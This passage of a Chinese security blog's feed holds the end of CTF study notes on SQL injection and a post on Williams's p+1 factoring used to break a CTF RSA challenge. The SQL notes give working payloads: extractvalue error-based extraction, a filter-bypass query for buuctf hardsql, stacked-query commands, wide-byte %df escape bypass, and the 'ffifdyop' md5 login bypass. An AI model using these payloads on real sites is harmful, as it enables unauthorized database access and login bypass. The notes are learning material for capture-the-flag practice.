extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure><h5 id="例题-buuctf-极客大挑战-hardsql"><a href="#例题-buuctf-极客大挑战-hardsql" class="headerlink" title="例题: buuctf 极客大挑战 hardsql"></a>例题: buuctf 极客大挑战 hardsql</h5><p>情景: <code>order by</code> <code>union</code> <code>空格</code> <code>and</code> 被过滤<br>查字段名时候的payload:<code>?username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code>   </p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在正常的语句后面加分号( ; ),可顺序执行多条语句, 从而造成注入漏洞.<br>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>堆叠注入可以搭配一些语句来绕过对某些关键词的过滤: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;show databases     ------列出所有数据库</span><br><span class="line">;show tables        ------列出所有表</span><br><span class="line">;show columns from table_name------列出某个表的所有字段</span><br><span class="line">;desc table_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通过RENAME更改flag所在表名为默认查询的表名"><a href="#通过RENAME更改flag所在表名为默认查询的表名" class="headerlink" title="通过RENAME更改flag所在表名为默认查询的表名"></a>通过<code>RENAME</code>更改flag所在表名为默认查询的表名</h2><p>更改表名:</p><blockquote><p><code>rename table tbl_name to new_tbl_name</code><br><code>alter table table_name to new name</code></p></blockquote><p>更改列名</p><blockquote><p><code>alter table t_app change name app_name varchar(20)</code></p></blockquote><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>利用编码转换, 将服务器端强制添加的本来用于转义的\符号吃掉, 从而能使攻击者输入的引号起到闭合作用, 以至于可以进行SQL注入.</p><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><p>如在进行<code>url?id=1&#39;</code>等操作时, 发现无论如何都不报错, 或者报错了莫名其妙的多出了有, 此时就可以使用<code>url?id=1%df&#39;</code>, 这时服务端会在’前面添加一个, \的ASCII码为0x5c, 因为前面的%df大于128, 服务端会将0xdf和0x5c合并成0xdf5c即汉字 “运”, 从而达到了绕过\转义’的目的</p><h3 id="PHP预处理"><a href="#PHP预处理" class="headerlink" title="PHP预处理"></a>PHP预处理</h3><p>使用concat(char(num,num,num)) 即使用ascii码转成字符再拼接来绕过对某些关键词的过滤.</p><h1 id="SQLite注入"><a href="#SQLite注入" class="headerlink" title="SQLite注入"></a>SQLite注入</h1><p>与sql不同的是, sqlite少了一些函数, 比如database()等等, 而且如果使用了不存在的函数也无法爆出库名.<br>但是sqlite存在一个sqlite_master表, 里面的字段为type/name/tbl_name/rootpage/sql<br>可以通过查询该表内信息得到表名, 并且可以通过sql字段内的sql语句得到对应表内的字段</p><h1 id="一些奇怪的总结"><a href="#一些奇怪的总结" class="headerlink" title="一些奇怪的总结???"></a>一些奇怪的总结???</h1><h2 id="jarvis-oj-login"><a href="#jarvis-oj-login" class="headerlink" title="jarvis oj - login"></a>jarvis oj - login</h2><p>这是一道要用万能密码登录的题<br>sql语句是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</span><br></pre></td></tr></table></figure><p>php的md5()这个函数, 可以有第二个参数, 如果是true, 则回返回原始的二进制数据, 也就是原本md5出来的32位十六进制字符串转成真正的十六字节的字符串.<br>那么这里要登录进去, 需要把语句构造成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;1&#39;&quot; </span><br><span class="line"># or后面的1可以换成别的, 只要是一个字符串就好了</span><br></pre></td></tr></table></figure><p>然后这里用到了一个字符串<code>ffifdyop</code>, 为啥用这个呢? 因为<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-794d608806ba4f49b52e2d5359f60040.png" alt="图片.png"><br>如果<code>$pass=ffifdyop</code>, 那么语句就会变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;6&#39;&quot; </span><br></pre></td></tr></table></figure><p>这样就能登录啦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一般注入&quot;&gt;&lt;a href=&quot;#一般注入&quot; class=&quot;headerlink&quot; title=&quot;一般注入&quot;&gt;&lt;/a&gt;一般注入&lt;/h2&gt;&lt;p&gt;通过修改参数的值, 例如&lt;strong&gt;正常数字 大数字 字符 单引号 双引号 括号 反斜杠等等&lt;/strong&gt;来探测是否</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
    <category term="SQL" scheme="http://tearsjin.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Williams&#39;s p+1 algorithm</title>
    <link href="http://tearsjin.github.io/2020/09/26/Williams-s-p-1-algorithm/"/>
    <id>http://tearsjin.github.io/2020/09/26/Williams-s-p-1-algorithm/</id>
    <published>2020-09-26T02:33:58.000Z</published>
    <updated>2021-03-13T02:55:30.882Z</updated>
    
    <content type="html"><![CDATA[<p>在计算数论中，Williams的p+1算法是一种整数分解算法，是代数群因子分解算法家族中的一种。它是Hugh C. Williams在1982年发明的。<br>如果要分解的数N包含一个或多个素数因子p，且p+1是光滑的(即p+1只包含小的因子)，那么Williams’s p+1有效。<br>Williams’s p+1使用Lucas序列在二次域中执行求幂运算。</p><p>它类似于Pollard的p−1算法。</p><h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>选择一个大于2的整数A来计算Lucas序列:<br>$$ V_0 = 2,V_1 = A $$<br>$$ V_j = AV_{j-1}-V_{j-2} $$<br><strong>其中所有的运算都是模N的</strong></p><p>当M是$p-(D/p)$的倍数时，奇素数p整除$gcd(N,V_M-2)$，</p><blockquote><p>$D=A^2-4$<br>$(D/P)$是jacobi symbol</p></blockquote><p>我们要求$(D/p)=-1$，即D应该是一个模p的二次的非剩余，但是由于我们不知道p，所以在找到解之前可能需要一个以上的A值。($D=A^2-4$)</p><p>如果$(D/p)=+1$，则该算法退化为Pollard的p−1算法的慢版本。</p><p>因此，对于不同的M值，我们计算 $gcd(N,V_{M-2})$ ，当结果不等于1或N时，我们便找到了N的一个非平凡因子。</p><p>使用的M值是连续的阶乘，而 $V_M$ 是以 $V_{M-1}$ 为特征的序列的第M个值</p><p>为了找到以B为特征的序列的第M个元素V，我们以类似于从左到右求幂的方式进行计算:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">x :&#x3D; B</span><br><span class="line">y :&#x3D; ( B ^ 2 - 2 ) MOD N</span><br><span class="line">for each bit of M to the right of the most significant bit do</span><br><span class="line">if the bit is 1 then</span><br><span class="line">x :&#x3D; ( x * y - B ) MOD N</span><br><span class="line">y :&#x3D; ( y ^ 2 - 2 ) MOD N</span><br><span class="line">else</span><br><span class="line">y :&#x3D; ( x ^ y - B ) MOD N</span><br><span class="line">x :&#x3D; ( x ^ 2 - 2 ) MOD N</span><br><span class="line">V :&#x3D; x</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>令n = 112729，A = 5，求得的$V_M$的连续值为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">V1 of seq(5) &#x3D; V1! of seq(5) &#x3D; 5</span><br><span class="line">V2 of seq(V1) &#x3D; V2! of seq(5) &#x3D; 23</span><br><span class="line">V3 of seq(V2) &#x3D; V3! of seq(5) &#x3D; 12098</span><br><span class="line">V4 of seq(V3) &#x3D; V4! of seq(5) &#x3D; 87680</span><br><span class="line">V5 of seq(V4) &#x3D; V5! of seq(5) &#x3D; 53242</span><br><span class="line">V6 of seq(V5) &#x3D; V6! of seq(5) &#x3D; 27666</span><br><span class="line">V7 of seq(V6) &#x3D; V7! of seq(5) &#x3D; 110229</span><br></pre></td></tr></table></figure><p>此时，$gcd(110229-2,112729) = 139$，所以139 是112729的一个非平凡素因子。<br>注意到 $p+1 = 140 = 2^2 * 5 * 7$。而 $7!$ 是最小的是140的倍数的阶乘数，所以我们找到了一个合适的因子139。</p><h2 id="例题-V-amp-N2020-公开赛-easy-RSA"><a href="#例题-V-amp-N2020-公开赛-easy-RSA" class="headerlink" title="例题 [V&amp;N2020 公开赛]easy_RSA"></a>例题 [V&amp;N2020 公开赛]easy_RSA</h2><p>就是因为这题，才会想到Williams’s p+1<br>审计代码发现n = q<em>p</em>r 中三个因子都是p+1光滑的所以想到Williams’s p+1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">A = [<span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">seq</span>(<span class="params">t, base, n</span>):</span></span><br><span class="line">    x = <span class="number">2</span></span><br><span class="line">    y = base</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x, y = y, (base * y - x) % n</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i == t:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fac = []</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>):</span><br><span class="line">        v = seq(i, v, n)</span><br><span class="line">        p = gmpy2.gcd(v - <span class="number">2</span>, n)</span><br><span class="line">        print(i,p)</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            fac.append(p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fac) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>当程序在A = 5 , i = 2391时<br>就跑出了其中一个因子为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393</span><br></pre></td></tr></table></figure><p>然后用n除以这个因子并对得数继续Williams’s p+1便可以分解出剩下的两个因子</p><blockquote><p>wiki没有中文可真是头大(原理和例子其实就是英文wiki上Williams’s p+1的摘抄+翻译啦</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在计算数论中，Williams的p+1算法是一种整数分解算法，是代数群因子分解算法家族中的一种。它是Hugh C. Williams在1982年发明的。&lt;br&gt;如果要分解的数N包含一个或多个素数因子p，且p+1是光滑的(即p+1只包含小的因子)，那么Williams’s p</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://tearsjin.github.io/categories/Algorithm/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="Algorithm" scheme="http://tearsjin.github.io/tags/Algorithm/"/>
    
  </entry>
  
</feed>
